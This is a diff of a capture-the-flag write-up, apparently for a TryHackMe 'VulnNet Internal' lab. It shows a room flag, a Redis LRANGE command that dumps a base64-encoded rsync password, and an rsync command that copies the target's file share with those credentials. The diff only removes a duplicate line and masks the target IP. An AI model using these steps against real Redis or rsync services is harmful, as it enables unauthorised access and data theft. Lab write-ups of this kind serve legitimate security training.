@@ -261,7 +261,6 @@ THM{ff8e518addbbddb74531a724236a8221}
 
 ```bash
 LRANGE authlist 1 5
-LRANGE authlist 1 5
 *3
 $112
 QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==
@@ -283,7 +282,7 @@ Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72
 <p>Explored <code>resync</code>: port 873.</p>
 
 ```bash
-~/VulnNetInternal# rsync -av rsync://rsync-connect@10.10.243.254:873/files ./files
+~/VulnNetInternal# rsync -av rsync://rsync-connect@Target_IP:873/files ./files
 ...
 ~/VulnNetInternal# ls
 files
